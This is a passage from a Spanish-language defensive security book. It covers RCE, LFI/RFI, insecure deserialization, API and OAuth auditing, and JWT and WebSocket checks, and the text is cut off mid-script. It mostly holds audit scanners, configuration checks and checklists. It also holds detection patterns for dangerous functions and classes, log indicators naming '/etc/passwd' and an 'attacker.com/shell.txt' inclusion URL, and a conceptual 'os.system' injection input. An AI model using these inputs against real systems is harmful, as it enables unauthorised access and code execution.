* [ ] Capturar errores de SQL y mostrar mensajes genéricos.
* [ ] Monitorear logs de consultas y errores 500.
* [ ] Usar WAF o reglas mod_security específicas para SQLi.
* [ ] Escanear periódicamente con herramientas autorizadas.
* [ ] Revisar scripts y endpoints antes del despliegue.

---

## 11. Conclusión

Las inyecciones SQL siguen siendo una de las vulnerabilidades más críticas del OWASP Top 10, pero también una de las más prevenibles.
Un Red Teamer ético no explota bases de datos: **las protege entendiendo cómo podrían ser atacadas**.
El dominio de herramientas como sqlmap, combinado con buenas prácticas de validación y monitoreo, permite construir aplicaciones más seguras y resilientes.

---

# Capítulo 39 — RCE y LFI/RFI: anatomía, detección y defensa

**Prevención de ejecución remota y vulnerabilidades de inclusión de archivos**

---

## Objetivos

* Comprender los conceptos técnicos de RCE, LFI y RFI y por qué son tan peligrosos.
* Reconocer patrones de riesgo en aplicaciones web (parámetros, uploads, includes).
* Implementar **scripts de auditoría y detección segura** en Python.
* Detectar bypasses de validación en cargas de archivos sin recurrir a explotación.
* Aprender estrategias de mitigación a nivel de código, servidor y red.

> **Aviso ético:** este capítulo es de carácter educativo y defensivo. Los ejemplos de detección están diseñados para usarse **solo** en entornos de laboratorio y con consentimiento del propietario. Ningún script ejecuta comandos ni modifica servidores.

---

## 1. Conceptos fundamentales

### a) RCE — Remote Code Execution

RCE ocurre cuando un atacante logra que el servidor ejecute código arbitrario.
Ejemplo conceptual (no operativo):

```text
input = "os.system('id')"  # si es evaluado directamente
```

El origen suele estar en funciones que evalúan entrada del usuario (p. ej. `eval`, `exec`, `system`, `popen`, plantillas dinámicas, deserialización insegura).

**Consecuencias:** acceso total al sistema, robo de datos o pivoting interno.
**Indicadores:** respuestas con ejecución, tiempos variables, errores del sistema.

---

### b) LFI — Local File Inclusion

El servidor carga archivos locales a partir de parámetros manipulables:

```text
GET /page.php?file=about.php
```

Si no se valida, puede accederse a rutas sensibles (`/etc/passwd`).

### c) RFI — Remote File Inclusion

Similar a LFI, pero permite cargar recursos externos (URLs) si la configuración lo permite (`allow_url_fopen=On` en PHP).

**Consecuencia:** ejecución de código remoto o exposición de información.

---

## 2. Causas comunes

| Origen                               | Ejemplo conceptual                         | Riesgo  |
| ------------------------------------ | ------------------------------------------ | ------- |
| **Includes no validados**            | `include($_GET['file']);`                  | LFI/RFI |
| **Subidas de archivos sin filtrado** | Cargar `.php` en un directorio ejecutable. | RCE     |
| **Deserialización insegura**         | Entrada JSON manipulada.                   | RCE     |
| **Evaluación de expresiones**        | `eval(user_input)` o plantillas.           | RCE     |
| **Configuraciones del servidor**     | `allow_url_include=On` o permisos 777.     | RFI     |

---

## 3. Señales de intento de explotación

* Logs con patrones `../`, `%2e%2e%2f` (traversal).
* Subidas de archivos con doble extensión (`.php.jpg`, `.jsp.txt`).
* Archivos recién creados en `/uploads/` con permisos ejecutables.
* Accesos a `/etc/passwd`, `/proc/self/environ`, `/var/www/html/config.php`.
* Solicitudes con URLs externas (`http://attacker.com/shell.txt`).
* Errores `include(): failed to open stream` o `Warning: file_get_contents()`.

---

## 4. Auditoría defensiva — scripts de detección segura

### Python — búsqueda de patrones de riesgo en código fuente

```python
#!/usr/bin/env python3
"""
rce_lfi_audit.py — Auditoría estática para detectar posibles vulnerabilidades RCE/LFI/RFI.
Propósito: analizar código local en busca de funciones peligrosas o includes no validados.
"""
import os, re, sys

patterns = {
    "RCE": re.compile(r"\b(exec|system|popen|eval|shell_exec|subprocess\.)\b", re.IGNORECASE),
    "LFI/RFI": re.compile(r"(include|require|readfile|get_contents)\s*\(.*\$_(GET|POST)", re.IGNORECASE),
    "Upload": re.compile(r"move_uploaded_file|copy\s*\(.*\$_FILES", re.IGNORECASE)
}

def scan_folder(path):
    findings = []
    for root, _, files in os.walk(path):
        for f in files:
            if f.endswith(('.php', '.py', '.js')):
                full = os.path.join(root, f)
                with open(full, encoding='utf-8', errors='ignore') as fh:
                    for n, line in enumerate(fh, 1):
                        for cat, pat in patterns.items():
                            if pat.search(line):
                                findings.append((cat, full, n, line.strip()))
    return findings

if len(sys.argv) != 2:
    print("Uso: python3 rce_lfi_audit.py <carpeta_proyecto>")
    sys.exit(1)

issues = scan_folder(sys.argv[1])
if not issues:
    print("[✔] No se detectaron patrones peligrosos.")
else:
    print("[!] Posibles riesgos detectados:")
    for cat, file, n, line in issues:
        print(f"{cat:<8} | {file}:{n} -> {line}")
```

**Qué hace:**

* Revisa el código fuente en busca de funciones críticas (`eval`, `system`, `include`, etc.).
* No ejecuta nada, solo alerta.
* Ideal para pipelines CI/CD o revisiones de código.

---

### Python — verificación de configuración segura del servidor

```python
#!/usr/bin/env python3
"""
server_config_check.py — Verifica configuraciones de seguridad en servidores locales.
No modifica archivos; solo alerta si detecta opciones peligrosas.
"""
import os

def check_php_ini(path="/etc/php.ini"):
    if not os.path.exists(path):
        print("[!] php.ini no encontrado.")
        return
    with open(path) as f:
        content = f.read()
        if "allow_url_include = On" in content:
            print("[!] Riesgo: 'allow_url_include' está habilitado.")
        if "allow_url_fopen = On" in content:
            print("[!] Riesgo: 'allow_url_fopen' permite RFI.")
        if "display_errors = On" in content:
            print("[!] 'display_errors' revela información sensible.")
    print("[✔] Revisión de php.ini completada.")

check_php_ini()
```

**Uso:** auditar entornos PHP locales y detectar configuraciones inseguras.

---

## 5. Control y validación de subidas de archivos

### Buenas prácticas:

* Permitir solo tipos MIME específicos (`image/png`, `text/plain`).
* Renombrar archivos antes de guardarlos.
* Almacenar fuera de la raíz pública del servidor.
* Validar extensión y contenido binario.
* Evitar ejecución de archivos subidos (directorio sin permisos de ejecución).

### Ejemplo defensivo (conceptual, Python):

```python
def validate_upload(file):
    allowed_ext = ('.png', '.jpg', '.txt')
    if not file.endswith(allowed_ext):
        raise ValueError("Extensión no permitida")
    with open(file, 'rb') as f:
        header = f.read(4)
        if b'<?ph' in header:
            raise ValueError("Archivo contiene código PHP sospechoso")
```

---

## 6. Mitigación en capas

| Capa                  | Medida                                        | Descripción                                                 |
| --------------------- | --------------------------------------------- | ----------------------------------------------------------- |
| **Aplicación**        | Validar y sanear todas las entradas           | Nunca usar funciones que evalúen texto del usuario.         |
| **Servidor web**      | Deshabilitar ejecución en `/uploads/`         | `Options -ExecCGI` (Apache) o `deny all` (Nginx).           |
| **Configuración PHP** | `allow_url_include=Off`, `display_errors=Off` | Evita inclusión remota y exposición de errores.             |
| **Permisos**          | Aislar procesos y carpetas                    | Usuarios separados, sin permisos de escritura cruzada.      |
| **Monitorización**    | Logs + EDR                                    | Detectar accesos a rutas no estándar o uploads ejecutables. |

---

## 7. Detección de explotación en logs (Blue Team)

**Eventos de interés:**

* Accesos con `../` en querystring.
* Solicitudes con doble extensión o carga sospechosa.
* Inclusiones remotas (`http://` en parámetros).
* Tiempos de respuesta irregulares.
* Creación de nuevos archivos `.php` en `/tmp` o `/uploads/`.

Ejemplo de alerta en SIEM (pseudo-SQL):

```sql
SELECT * FROM web_logs 
WHERE request LIKE '%../%' OR request LIKE '%.php%' 
OR response_code IN (500, 403) 
AND user_agent NOT LIKE '%Googlebot%'
```

---

## 8. Ejercicio de laboratorio seguro

1. Instala **bWAPP** o **DVWA** en una máquina virtual aislada.
2. Crea variantes de inputs que incluyan rutas (`../`, `%2e%2e%2f`) para entender su efecto en logs.
3. Observa el impacto y aplica validaciones (`basename`, listas blancas).
4. Configura `allow_url_fopen=Off` y repite las pruebas: las rutas remotas ya no funcionarán.
5. Genera reportes de mitigación con tus scripts de auditoría.

---

## 9. Checklist defensivo RCE / LFI / RFI

* [ ] Validar todas las variables pasadas a funciones de sistema o plantillas.
* [ ] Revisar configuraciones de PHP/Python/Node para deshabilitar inclusiones remotas.
* [ ] Monitorizar accesos a rutas de archivos no esperadas.
* [ ] Controlar los permisos de carpetas de subida.
* [ ] Revisar logs en busca de traversal (`../`).
* [ ] Mantener frameworks actualizados y usar librerías seguras.
* [ ] Auditar código con scripts estáticos (`rce_lfi_audit.py`).
* [ ] Automatizar revisión de configuración del servidor (`server_config_check.py`).
* [ ] Implementar WAF con reglas específicas de LFI/RFI.
* [ ] Activar alertas de creación de nuevos scripts ejecutables en `/uploads/`.

---

## 10. Conclusión

Las vulnerabilidades de inclusión de archivos y ejecución remota son de las más críticas porque atacan el corazón del sistema: la ejecución de código.
El verdadero profesional del Red Team no busca explotarlas, sino **entenderlas para eliminarlas antes de que lo hagan otros**.
Una auditoría periódica de código y configuración, acompañada de un monitoreo inteligente de logs, puede neutralizar estos vectores antes de que se conviertan en incidentes.

---

# Capítulo 40 — Deserialización insegura y defensa

**Análisis técnico en Java, .NET y PHP — auditoría, detección y prevención**

---

## Objetivos

* Comprender qué es la deserialización y por qué puede derivar en ejecución de código.
* Identificar patrones de riesgo en aplicaciones Java, .NET y PHP.
* Implementar scripts de detección segura en Python para auditar código fuente y binarios.
* Diseñar políticas de validación, listas blancas y monitoreo.
* Aprender a reconocer señales de abuso en logs y entornos de ejecución.

> **Aviso ético:** este capítulo tiene un enfoque **defensivo y educativo**. No se incluyen ni gadgets, ni cadenas de explotación, ni payloads. Las pruebas se deben realizar en entornos propios y controlados con fines de aprendizaje o auditoría autorizada.

---

## 1. Conceptos fundamentales

La **serialización** es el proceso de transformar un objeto o estructura de datos en un formato que pueda almacenarse o transmitirse (por ejemplo, a un archivo o a través de la red).
La **deserialización** es el proceso inverso: reconstruir el objeto a partir de ese formato.

Si el código que deserializa **acepta entradas no confiables**, un atacante podría inyectar datos manipulados para alterar el flujo lógico o incluso ejecutar código arbitrario.

---

## 2. Casos emblemáticos (históricos y educativos)

| Lenguaje | Biblioteca afectada        | Impacto observado                                                   | Lección                                            |
| -------- | -------------------------- | ------------------------------------------------------------------- | -------------------------------------------------- |
| **Java** | Apache Commons Collections | Gadgets permitían ejecutar comandos.                                | Verificar tipos antes de deserializar.             |
| **.NET** | BinaryFormatter            | Permite reconstrucción de objetos arbitrarios.                      | Evitar BinaryFormatter y usar JSON seguro.         |
| **PHP**  | `unserialize()`            | Carga objetos con métodos `__wakeup()` o `__destruct()` maliciosos. | No usar `unserialize()` sobre entradas de usuario. |

Aunque estos casos fueron resueltos con parches y controles, la vulnerabilidad persiste en implementaciones personalizadas.

---

## 3. Cómo ocurre una deserialización insegura

**Flujo conceptual:**

1. Una aplicación recibe datos de usuario (por HTTP, cookies, archivos, etc.).
2. Deserializa esos datos sin comprobar su origen o tipo.
3. Si el objeto contiene métodos especiales (`__wakeup`, `finalize`, `readObject`), estos se ejecutan automáticamente.
4. Un atacante puede aprovechar ese comportamiento para alterar la ejecución.

---

## 4. Lenguajes comunes y sus riesgos

### a) Java

* Clases como `ObjectInputStream` permiten deserializar objetos desde flujos binarios.
* Riesgo: si los datos provienen del usuario, se pueden cargar clases arbitrarias.
* **Defensa:** usar `ObjectInputFilter` (Java 9+) o bibliotecas seguras como Jackson con validaciones estrictas.

### b) .NET

* Clases como `BinaryFormatter` o `NetDataContractSerializer` pueden crear objetos con constructores peligrosos.
* **Defensa:** reemplazar por `DataContractJsonSerializer` o `System.Text.Json`.

### c) PHP

* La función `unserialize()` reconstruye objetos con todos sus métodos.
* **Defensa:** usar `json_decode()` o `unserialize($data, ['allowed_classes'=>false])`.

---

## 5. Auditoría de código fuente (detección pasiva)

### Python — escaneo de funciones peligrosas

```python
#!/usr/bin/env python3
"""
deserialize_audit.py — Analiza código en busca de patrones de deserialización insegura.
No ejecuta ni modifica nada; sirve para auditorías seguras.
"""
import os, re, sys

patterns = {
    "Java": re.compile(r"\bObjectInputStream\b|\breadObject\b"),
    ".NET": re.compile(r"\bBinaryFormatter\b|\bDeserialize\b"),
    "PHP": re.compile(r"\bunserialize\s*\(", re.IGNORECASE)
}

def scan(folder):
    findings = []
    for root, _, files in os.walk(folder):
        for f in files:
            if f.endswith(('.java', '.cs', '.php')):
                full = os.path.join(root, f)
                with open(full, encoding='utf-8', errors='ignore') as code:
                    for n, line in enumerate(code, 1):
                        for lang, pat in patterns.items():
                            if pat.search(line):
                                findings.append((lang, full, n, line.strip()))
    return findings

if len(sys.argv) != 2:
    print("Uso: python3 deserialize_audit.py <carpeta>")
    sys.exit(1)

res = scan(sys.argv[1])
if not res:
    print("[✔] No se encontraron posibles deserializaciones inseguras.")
else:
    print("[!] Coincidencias encontradas:")
    for lang, f, n, line in res:
        print(f"{lang:<5} | {f}:{n} -> {line}")
```

**Explicación:**

* Busca funciones de deserialización conocidas.
* No analiza binarios ni ejecuta código.
* Permite identificar fragmentos a revisar manualmente.

---

## 6. Auditoría dinámica (entornos controlados)

Para detectar comportamientos sospechosos:

* Registrar entradas y salidas de objetos deserializados.
* Monitorear uso de memoria o creación de objetos inusuales.
* Activar trazas de seguridad (`SecurityManager`, `AppDomain`, `php.ini: serialize_precision`).
* Simular objetos legítimos y comprobar que no se carguen otros tipos.

---

## 7. Indicadores en logs

| Indicador                                    | Descripción                             | Acción                        |
| -------------------------------------------- | --------------------------------------- | ----------------------------- |
| Errores `unserialize(): Error at offset`     | Datos corruptos manipulados.            | Revisar fuente de entrada.    |
| `readObject()` lanzando excepciones          | Intento de cargar clases no permitidas. | Implementar filtros de clase. |
| Creación de objetos inesperados en GC o heap | Inyección de clases.                    | Revisar cadenas recibidas.    |
| Aumento de CPU tras deserialización          | Ejecución no intencionada.              | Limitar tamaño de entrada.    |

---

## 8. Buenas prácticas por plataforma

### Java

* **Usar listas blancas**:

  ```java
  ObjectInputFilter filter = info -> {
      if (info.serialClass() != null && !info.serialClass().getName().startsWith("com.seguro"))
          return Status.REJECTED;
      return Status.ALLOWED;
  };
  ObjectInputStream.setObjectInputFilter(filter);
  ```
* Actualizar bibliotecas (`commons-collections`, `spring-core`).
* Evitar deserializar objetos de red.

### .NET

* Reemplazar `BinaryFormatter` por `System.Text.Json`.
* Implementar contratos de datos explícitos (`[DataContract]`).
* Validar tamaño máximo del flujo antes de deserializar.

### PHP

* Usar `json_decode()` para estructuras simples.
* Deshabilitar clases desconocidas en `unserialize()`.
* Revisar el uso de `__wakeup` y `__destruct`.

---

## 9. Scripts de validación complementaria

### Python — detección de objetos no permitidos en flujo

```python
#!/usr/bin/env python3
"""
check_serial_stream.py — Analiza archivos binarios buscando patrones de clases sospechosas.
Uso: python3 check_serial_stream.py <archivo>
"""
import sys

if len(sys.argv) != 2:
    print("Uso: python3 check_serial_stream.py <archivo>")
    sys.exit(1)

with open(sys.argv[1], 'rb') as f:
    data = f.read()

suspect_classes = [b"Runtime", b"ProcessBuilder", b"System", b"PowerShell", b"cmd"]
for cls in suspect_classes:
    if cls in data:
        print(f"[!] Posible clase peligrosa detectada: {cls.decode()}")
print("[✔] Análisis completado.")
```

**Propósito:** analizar flujos serializados para verificar que no contengan clases críticas como `Runtime` o `ProcessBuilder`.

---

## 10. Estrategia de defensa por capas

| Capa             | Medida                                                                    |
| ---------------- | ------------------------------------------------------------------------- |
| **Aplicación**   | Evitar deserializar entradas no confiables.                               |
| **Lenguaje**     | Usar serialización JSON o formatos planos.                                |
| **Servidor**     | Validar tamaño y origen de datos antes de procesar.                       |
| **Red**          | Bloquear payloads sospechosos (IDS/WAF).                                  |
| **Logs**         | Monitorizar errores de deserialización.                                   |
| **Capacitación** | Formar a desarrolladores sobre los riesgos de `unserialize()` y `eval()`. |

---

## 11. Ejercicio de laboratorio ético

1. Configura entornos Java, .NET y PHP con ejemplos de serialización legítima (sin vulnerabilidades).
2. Crea un flujo de datos serializados entre cliente y servidor local.
3. Introduce campos inesperados y observa los logs.
4. Implementa filtros de validación o reemplazo de funciones inseguras.
5. Documenta los resultados y el impacto de las defensas aplicadas.

---

## 12. Checklist de mitigación

* [ ] Reemplazar funciones de deserialización inseguras (`unserialize`, `BinaryFormatter`, `readObject`).
* [ ] Implementar validaciones de tipo o listas blancas.
* [ ] Limitar tamaño de entrada deserializada.
* [ ] Aislar procesos que manipulan objetos externos.
* [ ] Deshabilitar mensajes de error detallados en producción.
* [ ] Mantener bibliotecas actualizadas.
* [ ] Revisar logs ante errores de deserialización.
* [ ] Probar integraciones con scripts de auditoría.

---

## 13. Conclusión

La deserialización insegura no es solo un fallo de código, sino una **falla de confianza**: asumir que los datos recibidos son fiables.
En Java, .NET y PHP, la serialización automática es útil pero peligrosa si no se valida.
El enfoque moderno consiste en usar **formatos neutros (JSON, YAML seguros)**, **filtros de clases** y auditorías continuas.
El Red Teamer ético conoce cómo un atacante podría abusar de la deserialización… para asegurarse de que nunca lo consiga.

---

# Capítulo 41 — API Hacking y abuso de OAuth

**Evaluación de APIs REST y GraphQL — Seguridad, autorización y automatización ética**

---

## Objetivos

* Comprender las superficies de ataque en APIs modernas (REST, GraphQL, SOAP).
* Analizar las debilidades más comunes en autenticación y autorización.
* Aprender cómo auditar flujos OAuth 2.0 y OpenID Connect desde un enfoque ético.
* Desarrollar scripts en **Python (requests)** para detección pasiva y validación segura.
* Implementar prácticas de hardening y mitigación en APIs corporativas.

> **Aviso ético:** este capítulo aborda técnicas de *evaluación defensiva y controlada*. Cualquier auditoría de API debe contar con **autorización previa y documentación del alcance**. Los ejemplos aquí presentados son seguros y se limitan al análisis pasivo y automatizado de entornos propios o de laboratorio.

---

## 1. Introducción: por qué las APIs son el nuevo campo de batalla

En los últimos años, las APIs se convirtieron en el principal vector de comunicación entre microservicios, aplicaciones móviles y frontends modernos.
Al ser públicas o semipúblicas, las APIs suelen exponer endpoints críticos que, si no están protegidos correctamente, pueden filtrar información, permitir acceso indebido o facilitar movimientos laterales.

**Principales motivos de riesgo:**

* Errores de autorización (Broken Object Level Authorization, BOLA).
* Falta de validación de parámetros o filtros.
* Exposición de metadatos o descripciones (`/swagger`, `/graphql`, `/introspection`).
* Tokens mal gestionados o persistentes.
* Validaciones insuficientes en flujos OAuth.

---

## 2. Tipos de API más comunes

| Tipo        | Descripción                                                                    | Riesgos típicos                                  |
| ----------- | ------------------------------------------------------------------------------ | ------------------------------------------------ |
| **REST**    | Basada en HTTP con endpoints y verbos (`GET`, `POST`, `PUT`, `DELETE`).        | IDOR, fuga de datos, rate limiting débil.        |
| **GraphQL** | Lenguaje de consulta para APIs complejas, permite solicitar datos arbitrarios. | Exposición masiva por introspección o recursion. |
| **SOAP**    | XML estructurado, usado en sistemas legados.                                   | Inyección XML, disclosure de schema.             |

---

## 3. Fallas comunes en APIs REST y GraphQL

1. **Falta de control de acceso granular (BOLA):** un usuario puede acceder a datos de otro cambiando un ID.
2. **Exposición de endpoints administrativos:** `/admin`, `/internal`, `/config`.
3. **Ausencia de rate limit:** ataques de fuerza bruta o enumeración.
4. **GraphQL introspection abierta:** permite conocer toda la estructura de la API.
5. **Tokens JWT mal validados:** uso de claves débiles o sin expiración.
6. **Validación deficiente de cabeceras CORS o `Origin`.**

---

## 4. OAuth 2.0 y OpenID Connect — fundamentos

**OAuth 2.0** es un marco para delegar autorización entre aplicaciones.
**OpenID Connect (OIDC)** agrega autenticación sobre OAuth.

Flujos principales:

* **Authorization Code Flow:** para apps con backend seguro.
* **Implicit Flow:** para apps SPA (deprecado).
* **Client Credentials:** autenticación entre servicios.
* **Device Flow:** autenticación en dispositivos sin navegador.

### Riesgos comunes

| Vector                                | Ejemplo                                    | Impacto                  |
| ------------------------------------- | ------------------------------------------ | ------------------------ |
| **Token leakage**                     | Token en logs, URLs o headers.             | Acceso no autorizado.    |
| **Reuse de tokens**                   | Reutilización de refresh tokens caducados. | Persistencia no deseada. |
| **Redirect URI injection**            | Manipulación del parámetro `redirect_uri`. | Redirección de tokens.   |
| **Scope overgranting**                | Permisos excesivos concedidos.             | Exposición innecesaria.  |
| **Validación débil de `aud` y `iss`** | Aceptar tokens de emisores no válidos.     | Bypass de autenticación. |

---

## 5. Evaluación ética de APIs (fase pasiva)

### Paso 1 — Descubrimiento

* Buscar endpoints públicos con `/swagger.json`, `/api/docs`, `/graphql`.
* Revisar encabezados de versión o comentarios en respuestas (`X-Powered-By`).
* Verificar el uso de HTTPS y cabeceras de seguridad (`Strict-Transport-Security`, `Access-Control-Allow-Origin`).

### Paso 2 — Enumeración

* Analizar rutas válidas con métodos seguros (`OPTIONS`, `HEAD`).
* Detectar inconsistencias de permisos o campos expuestos.
* Mapear relaciones entre recursos (usuarios, productos, IDs).

### Paso 3 — Validación de OAuth

* Revisar flujo de autorización y almacenamiento de tokens.
* Verificar expiración (`exp`), audiencia (`aud`) y emisor (`iss`) en JWTs.
* Analizar si el servidor valida las firmas correctamente.

---

## 6. Scripts defensivos en Python

### 6.1 — Auditor de endpoints y cabeceras

```python
#!/usr/bin/env python3
"""
api_audit_headers.py — Auditoría pasiva de APIs REST.
Valida HTTPS, cabeceras de seguridad y status codes.
"""
import requests, sys

if len(sys.argv) != 2:
    print("Uso: python3 api_audit_headers.py <url_base>")
    sys.exit(1)

url = sys.argv[1].rstrip('/')
endpoints = ["/", "/api", "/swagger.json", "/graphql", "/health", "/docs"]
headers_interes = ["Strict-Transport-Security", "X-Content-Type-Options", 
                   "Access-Control-Allow-Origin", "Authorization"]

for ep in endpoints:
    full = url + ep
    try:
        r = requests.get(full, timeout=5, verify=False)
        print(f"\n[*] {full} -> {r.status_code}")
        for h in headers_interes:
            if h in r.headers:
                print(f"   {h}: {r.headers[h]}")
            else:
                print(f"   [!] Falta cabecera {h}")
    except Exception as e:
        print(f"   Error accediendo a {full}: {e}")
```

**Uso ético:** inspecciona cabeceras y detecta carencias de seguridad (sin enviar payloads ni alterar tráfico).

---

### 6.2 — Verificación de tokens JWT (sin exposición)

```python
#!/usr/bin/env python3
"""
jwt_verify.py — Valida estructura y expiración de tokens JWT.
Uso: python3 jwt_verify.py <token>
"""
import sys, base64, json, time

if len(sys.argv) != 2:
    print("Uso: python3 jwt_verify.py <token>")
    sys.exit(1)

token = sys.argv[1]
parts = token.split('.')
if len(parts) != 3:
    print("[!] Token JWT inválido.")
    sys.exit(1)

def b64decode(data):
    data += '=' * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())

header = json.loads(b64decode(parts[0]))
payload = json.loads(b64decode(parts[1]))
print("[+] Header:", json.dumps(header, indent=2))
print("[+] Payload:", json.dumps(payload, indent=2))

if 'exp' in payload:
    exp = payload['exp']
    print("[+] Expira:", time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(exp)))
    if exp < time.time():
        print("[!] Token expirado.")
else:
    print("[!] Campo 'exp' no presente.")
```

**Qué hace:** valida estructura, muestra cabeceras y confirma expiración sin verificar firmas ni contactar al servidor.

---

## 7. GraphQL — detección ética de introspección

En GraphQL, el endpoint `/graphql` suele permitir ejecutar queries arbitrarias.
Para limitar riesgos, el modo introspection debe estar deshabilitado en producción.

**Detección pasiva:**

1. Realizar una petición POST a `/graphql` con el cuerpo:

   ```json
   {"query": "{ __schema { types { name } } }"}
   ```
2. Si responde con nombres de tipos, introspection está habilitado.
3. Si devuelve error o vacío, está correctamente deshabilitado.

**Defensa:**

* Desactivar introspection en producción (`graphql.enable_introspection = false`).
* Validar profundidad de queries (`maxDepth` y `query complexity limit`).
* Implementar autenticación por campo y rol.

---

## 8. OAuth — auditoría segura paso a paso

### 1. Verificación del flujo

* Comprobar redirección segura (`redirect_uri` exacto, sin comodines).
* Revisar si los tokens incluyen `aud` y `iss` válidos.
* Confirmar expiración de `access_token` y `refresh_token`.

### 2. Validación de scopes

* Analizar qué permisos se otorgan al cliente.
* Rechazar permisos excesivos como `admin` o `all`.
* Usar scopes mínimos necesarios para cada cliente.

### 3. Detección de fugas de token

* Revisar headers, logs y URLs.
* No almacenar tokens en cookies sin flag `HttpOnly`.
* Usar almacenamiento seguro (encriptado, session storage).

---

## 9. Medidas de mitigación por capa

| Capa                | Mitigación                                                   |
| ------------------- | ------------------------------------------------------------ |
| **Aplicación**      | Autenticación robusta, scopes mínimos y validación estricta. |
| **API Gateway**     | Rate limiting, JWT validation, CORS seguro.                  |
| **Transporte**      | HTTPS obligatorio y HSTS activo.                             |
| **Identidad (IdP)** | Revisar `redirect_uri`, rotación de claves y auditorías.     |
| **Monitorización**  | Alertas por uso indebido de tokens o introspección.          |

---

## 10. Ejercicio práctico (entorno seguro)

1. Implementa una API REST en Flask o FastAPI con autenticación OAuth simulada.
2. Usa `api_audit_headers.py` para analizar cabeceras y endpoints.
3. Genera un token JWT con expiración corta y verifica su validez con `jwt_verify.py`.
4. Activa introspection en GraphQL y observa los resultados, luego desactívala.
5. Documenta diferencias en visibilidad, permisos y respuestas.

---

## 11. Checklist defensivo para APIs y OAuth

* [ ] Usar HTTPS en todos los endpoints.
* [ ] Implementar rate limiting.
* [ ] Validar correctamente `redirect_uri`.
* [ ] Verificar firmas JWT y expiración.
* [ ] No permitir introspection en producción.
* [ ] Revisar cabeceras de seguridad y CORS.
* [ ] Evitar scopes excesivos.
* [ ] Auditar logs de API Gateway y tokens.
* [ ] Implementar detección de abuso por IP/tasa.
* [ ] Integrar los resultados con SIEM o dashboards de seguridad.

---

## 12. Conclusión

Las APIs modernas son el eslabón más expuesto de cualquier arquitectura digital.
Una vulnerabilidad en autorización o manejo de tokens puede abrir puertas a toda la infraestructura.
Un Red Teamer ético no busca explotar esas debilidades, sino anticiparlas, documentarlas y ayudar a mitigarlas antes de que lo haga un atacante real.
La combinación de scripts automáticos, revisión manual y control de flujo OAuth permite construir APIs **seguras, observables y resilientes**.

---

# Capítulo 42 — Ataques a aplicaciones modernas (SPA, JWT y WebSockets)

**Vectores, auditorías éticas y scripts de prueba controlados**

---

## Objetivos

* Comprender la arquitectura de las aplicaciones modernas (*Single Page Applications*, SPA) y su superficie de ataque.
* Analizar los riesgos y malas configuraciones más comunes en el uso de **JWT**, **WebSockets** y frameworks como React, Angular o Vue.
* Desarrollar scripts de auditoría defensiva y pruebas pasivas para clientes web y APIs en tiempo real.
* Implementar estrategias de mitigación en seguridad de sesión, comunicación y almacenamiento local.

> **Aviso ético:** este capítulo tiene fines exclusivamente **educativos y de defensa**. No se muestran exploits ni payloads ofensivos. Los ejemplos se centran en detección, configuración segura y prácticas de auditoría que pueden ejecutarse en entornos propios o de laboratorio controlado.

---

## 1. Introducción: el ecosistema de las aplicaciones modernas

Las SPA (Single Page Applications) y las aplicaciones con arquitectura API-first son hoy el estándar.
Su comunicación depende de **APIs REST o GraphQL**, autenticación basada en **tokens JWT**, y mecanismos de actualización en tiempo real como **WebSockets**.

Estos avances traen ventajas —velocidad, asincronía, UX— pero también exponen nuevos vectores de riesgo si se descuidan las validaciones del lado servidor y los controles de sesión.

---

## 2. Riesgos principales en SPAs modernas

| Área                      | Riesgo                                                     | Impacto                                             |
| ------------------------- | ---------------------------------------------------------- | --------------------------------------------------- |
| **Autenticación**         | Tokens persistentes en `localStorage` o sin expiración.    | Robo o reutilización de sesión.                     |
| **Autorización**          | Falta de verificación del rol del usuario en endpoints.    | Acceso indebido a datos sensibles.                  |
| **Comunicación**          | WebSockets sin validación ni cifrado.                      | Interceptación de mensajes.                         |
| **CORS y CSP**            | Configuración permisiva (`*` o dominios múltiples).        | Inyección o filtrado inadecuado.                    |
| **JWT mal firmados**      | Algoritmos inseguros (`none`, `HS256` con claves débiles). | Suplantación de identidad.                          |
| **Actualización en vivo** | Sin control de origen ni autenticación en canales.         | Ataques de inyección o manipulación en tiempo real. |

---

## 3. Estructura típica de una SPA

1. **Frontend (React/Vue/Angular)**: ejecuta el cliente, maneja rutas internas y tokens.
2. **Backend (API)**: recibe peticiones autenticadas por token JWT.
3. **Servicio de mensajería**: WebSocket o WebRTC para eventos en vivo.
4. **Almacenamiento local**: `localStorage`, `sessionStorage` o IndexedDB.

Cada uno de estos componentes puede convertirse en un vector si el control de acceso se realiza solo en el cliente.

---

## 4. JWT (JSON Web Tokens): auditoría y validación

Un JWT consta de tres partes separadas por puntos:
**header.payload.signature**

### Riesgos comunes

* Tokens **sin expiración** (`exp`).
* Uso del algoritmo **none** (sin firma).
* Claves HMAC débiles o compartidas.
* Falta de validación del campo `aud` (audiencia).
* Reutilización o exposición en logs y URLs.

---

### Auditoría ética de JWT — script de validación

```python
#!/usr/bin/env python3
"""
jwt_audit_extended.py — Valida seguridad de tokens JWT sin necesidad de servidor.
"""
import sys, base64, json, time

if len(sys.argv) != 2:
    print("Uso: python3 jwt_audit_extended.py <token>")
    sys.exit(1)

def b64decode(data):
    data += "=" * (-len(data) % 4)
    return base64.urlsafe_b64decode(data.encode())

token = sys.argv[1]
header, payload, signature = token.split('.')

hdr = json.loads(b64decode(header))
pld = json.loads(b64decode(payload))

print("[+] Header:", json.dumps(hdr, indent=2))
print("[+] Payload:", json.dumps(pld, indent=2))

# Validaciones básicas
if hdr.get("alg") == "none":
    print("[!] Inseguro: el algoritmo de firma es 'none'.")
if "exp" not in pld:
    print("[!] El token no tiene expiración.")
elif pld["exp"] < time.time():
    print("[!] Token expirado.")
if "aud" not in pld:
    print("[!] Falta el campo 'aud' (audiencia).")
if len(signature) < 20:
    print("[!] La firma parece demasiado corta (posible debilidad).")
```

**Objetivo:** validar tokens sin exponerlos. No se verifican firmas ni se conecta a servidores externos.

---

## 5. WebSockets: auditoría segura de canales en tiempo real

Los **WebSockets** permiten comunicación bidireccional persistente entre cliente y servidor (`ws://` o `wss://`).
Su uso incorrecto puede provocar fugas de datos o manipulación de eventos.

**Riesgos típicos:**

* Falta de autenticación por mensaje.
* Canales sin TLS (`ws://` en lugar de `wss://`).
* Falta de control de origen (`Origin` o `Sec-WebSocket-Protocol`).
* Sin verificación de tipo de mensaje (texto/binario).

---

### Script defensivo — verificación de canal WebSocket

```python
#!/usr/bin/env python3
"""
ws_audit_client.py — Cliente de auditoría segura para WebSockets.
Verifica handshake y cabeceras, sin enviar datos peligrosos.
"""
import websocket, ssl

target = "wss://miapp.local/ws"

try:
    ws = websocket.create_connection(target, sslopt={"cert_reqs": ssl.CERT_REQUIRED})
